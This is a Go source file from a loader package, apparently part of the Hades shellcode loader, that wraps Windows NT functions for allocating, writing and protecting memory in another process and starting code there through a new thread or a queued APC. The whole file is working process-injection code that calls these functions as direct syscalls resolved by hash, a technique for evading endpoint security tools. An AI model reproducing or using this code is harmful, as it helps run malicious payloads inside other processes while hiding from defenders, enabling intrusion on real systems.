//go:build direct_syscalls

package loader

import (
	"errors"
	"fmt"

	"github.com/f1zm0/hades/pkg/syscalls"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

var NT_SUCCESS = acheron.NT_SUCCESS

func (l *Loader) NtAllocateVirtualMemory(
	hProc, baseAddr uintptr,
	memSize int,
	allocType, protectAttr uintptr,
) (uintptr, error) {
	sc, _ := l.callProxy.GetSyscall(15141956341870172521)
	if st := syscalls.DirectSyscall(
		sc.SSN,
		hProc,              // ProcessHandle
		ptr2ptr(&baseAddr), // BaseAddress
		nullptr,            // ZeroBits
		ptr2ptr(&memSize),  // RegionSize
		allocType,          // AllocationType
		protectAttr,        // Protect
	); !NT_SUCCESS(st) {
		return nullptr, fmt.Errorf("NtAllocateVirtualMemory failed: 0x%x", st)
	}

	return baseAddr, nil
}

func (l *Loader) NtWriteVirtualMemory(
	hProc, baseAddr uintptr,
	buf []byte,
	numBytesToWrite int,
) (uintptr, error) {
	numOfBytesWritten := 0
	sc, _ := l.callProxy.GetSyscall(11082677680923502116)
	if st := syscalls.DirectSyscall(
		sc.SSN,
		hProc,                       // ProcessHandle
		baseAddr,                    // BaseAddress
		ptr2ptr(&buf[0]),            // Buffer
		ptr(numBytesToWrite),        // NumberOfBytesToWrite
		ptr2ptr(&numOfBytesWritten), // NumberOfBytesWritten
	); !NT_SUCCESS(st) {
		return nullptr, fmt.Errorf("NtWriteVirtualMemory failed: 0x%x", st)
	}
	if numOfBytesWritten != numBytesToWrite {
		return nullptr, errors.New(
			"number of bytes written is not equal to number of bytes to write",
		)
	}

	return nullptr, nil
}

func (l *Loader) NtProtectVirtualMemory(
	hProc, baseAddr uintptr,
	memSize int,
	newProtect uintptr,
	oldProtect uintptr,
) (uintptr, error) {
	sc, _ := l.callProxy.GetSyscall(8024050266839726481)
	if st := syscalls.DirectSyscall(
		sc.SSN,
		hProc,                // ProcessHandle
		ptr2ptr(&baseAddr),   // BaseAddress
		ptr2ptr(&memSize),    // RegionSize
		newProtect,           // NewProtect
		ptr2ptr(&oldProtect), // OldProtect
	); !NT_SUCCESS(st) {
		return nullptr, fmt.Errorf("NtProtectVirtualMemory failed: 0x%x", st)
	}

	return oldProtect, nil
}

func (l *Loader) NtCreateThreadEx(hThread, hProc, baseAddr uintptr) (uintptr, error) {
	sc, _ := l.callProxy.GetSyscall(12013194309262373545)
	if st := syscalls.DirectSyscall(
		sc.SSN,
		ptr2ptr(&hThread),       // ThreadHandle
		windows.GENERIC_EXECUTE, // DesiredAccess
		nullptr,                 // ObjectAttributes
		hProc,                   // ProcessHandle
		baseAddr,                // StartRoutine
		nullptr,                 // Argument
		0,                       // CreateFlags
		0,                       // ZeroBits
		0,                       // StackSize
		0,                       // MaxStackSize
		nullptr,                 // AttributeList
	); !NT_SUCCESS(st) {
		return nullptr, fmt.Errorf("NtCreateThreadEx failed: 0x%x", st)
	}

	return hThread, nil
}

func (l *Loader) NtQueueApcThread(hThread, baseAddr uintptr) (uintptr, error) {
	sc, _ := l.callProxy.GetSyscall(14616308599774217599)
	if st := syscalls.DirectSyscall(
		sc.SSN,
		hThread,  // ThreadHandle
		baseAddr, // ApcRoutine
		nullptr,  // ApcRoutineContext (optional)
		nullptr,  // ApcStatusBlock (optional)
		nullptr,  // ApcReserved (optional)
	); !NT_SUCCESS(st) {
		return nullptr, fmt.Errorf("NtQueueApcThread failed: 0x%x", st)
	}

	return nullptr, nil
}
